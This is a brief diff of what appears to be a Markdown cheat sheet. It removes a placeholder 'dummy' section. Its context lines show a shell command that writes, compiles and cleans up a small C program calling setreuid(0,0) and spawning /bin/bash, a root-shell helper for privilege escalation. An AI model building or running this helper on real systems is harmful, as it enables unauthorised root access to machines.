@@ -9,10 +9,3 @@ echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c;
 gcc pwn.c -o <filename|shell>;
 rm pwn.c
 ```
-
-## dummy
-
-```foo
-dummy
-multiline
-````
